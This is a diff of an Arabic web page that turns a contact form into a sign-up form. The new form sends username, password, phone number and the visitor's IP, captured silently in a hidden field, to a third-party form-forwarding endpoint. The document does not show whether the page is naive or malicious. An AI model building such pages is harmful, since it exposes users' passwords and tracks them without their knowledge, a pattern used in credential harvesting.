@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نموذج التواصل</title>
+    <title>نموذج تسجيل جديد</title>
     <style>
         * {
             box-sizing: border-box;
@@ -13,7 +13,8 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            /* خلفية متدرجة ملونة */
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -23,79 +24,75 @@
 
         .container {
             width: 100%;
-            max-width: 500px;
+            max-width: 450px;
         }
 
         .contact-form {
             background-color: #ffffff;
-            padding: 40px 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            padding: 35px 25px;
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            border-top: 5px solid #764ba2;
         }
 
         .contact-form h2 {
             color: #333;
-            margin-bottom: 10px;
+            margin-bottom: 25px;
             text-align: center;
             font-size: 24px;
-        }
-
-        .contact-form p {
-            color: #666;
-            margin-bottom: 30px;
-            text-align: center;
-            font-size: 14px;
-            line-height: 1.5;
+            font-weight: 700;
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
 
         .form-group label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             color: #555;
             font-weight: 600;
             font-size: 14px;
         }
 
-        .form-group input,
-        .form-group textarea {
+        /* تنسيق الحقول */
+        .form-group input {
             width: 100%;
             padding: 12px 15px;
-            border: 1px solid #ddd;
+            border: 2px solid #e0e0e0;
             border-radius: 8px;
             font-size: 15px;
             transition: all 0.3s ease;
             font-family: inherit;
-            background-color: #f9f9f9;
+            background-color: #fafafa;
         }
 
-        .form-group input:focus,
-        .form-group textarea:focus {
+        /* تأثير التوهج عند الكتابة */
+        .form-group input:focus {
             outline: none;
-            border-color: #4A90E2;
+            border-color: #667eea;
             background-color: #fff;
-            box-shadow: 0 0 0 4px rgba(74, 144, 226, 0.1);
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.15);
         }
 
+        /* زر الإرسال الملون */
         .submit-btn {
             width: 100%;
             padding: 14px;
-            background-color: #4A90E2;
+            background: linear-gradient(to right, #667eea, #764ba2);
             color: white;
             border: none;
             border-radius: 8px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            transition: background-color 0.3s ease, transform 0.1s ease;
-            margin-top: 10px;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            margin-top: 15px;
         }
 
         .submit-btn:hover {
-            background-color: #357ABD;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(118, 75, 162, 0.4);
         }
 
         .submit-btn:active {
@@ -106,28 +103,61 @@
 <body>
 
     <div class="container">
-        <form action="https://formspree.io/f/xjygjrzn" method="POST" class="contact-form">
-            <h2>تواصل معنا</h2>
-            <p>يرجى تعبئة النموذج أدناه وسنقوم بالرد عليك في أقرب وقت ممكن.</p>
+        <!-- تم وضع الرابط الخاص بك هنا -->
+        <form action="https://formspree.io/f/xjygjrzn" method="POST" class="contact-form" id="mainForm">
+            <h2>تسجيل حساب جديد</h2>
             
+            <!-- 1. اسم المستخدم -->
             <div class="form-group">
-                <label for="name">الاسم الكامل</label>
-                <input type="text" id="name" name="name" placeholder="اكتب اسمك هنا" required>
+                <label for="username">👤 اسم المستخدم</label>
+                <input type="text" id="username" name="username" placeholder="اكتب اسم المستخدم" required>
             </div>
 
+            <!-- 2. كلمة المرور -->
             <div class="form-group">
-                <label for="email">البريد الإلكتروني</label>
-                <input type="email" id="email" name="email" placeholder="example@email.com" required>
+                <label for="password">🔒 كلمة المرور</label>
+                <input type="password" id="password" name="password" placeholder="********" required>
             </div>
 
+            <!-- 3. تأكيد كلمة المرور -->
             <div class="form-group">
-                <label for="message">رسالتك</label>
-                <textarea id="message" name="message" rows="5" placeholder="اكتب رسالتك هنا..." required></textarea>
+                <label for="confirm_password">🔐 تأكيد كلمة المرور</label>
+                <input type="password" id="confirm_password" name="confirm_password" placeholder="********" required>
             </div>
 
-            <button type="submit" class="submit-btn">إرسال الرسالة</button>
+            <!-- 4. رقم الجوال -->
+            <div class="form-group">
+                <label for="phone">📱 رقم الجوال</label>
+                <input type="tel" id="phone" name="phone" placeholder="05xxxxxxxx" required>
+            </div>
+
+            <!-- 5. الـ IP (مخفي ويتم تعبئته تلقائياً) -->
+            <input type="hidden" id="ip_address" name="ip_address">
+
+            <button type="submit" class="submit-btn">إرسال البيانات</button>
         </form>
     </div>
+
+    <script>
+        // 1. جلب عنوان الـ IP الخاص بالزائر ووضعه في الحقل المخفي تلقائياً
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip_address').value = data.ip;
+            })
+            .catch(error => console.log('لم نتمكن من جلب الـ IP:', error));
+
+        // 2. التحقق من تطابق كلمتي المرور
+        document.getElementById('mainForm').addEventListener('submit', function(e) {
+            const pass = document.getElementById('password').value;
+            const confirmPass = document.getElementById('confirm_password').value;
+            
+            if (pass !== confirmPass) {
+                e.preventDefault(); // منع إرسال النموذج
+                alert('⚠️ خطأ: كلمة المرور وتأكيد كلمة المرور غير متطابقين!');
+            }
+        });
+    </script>
 
 </body>
 </html>
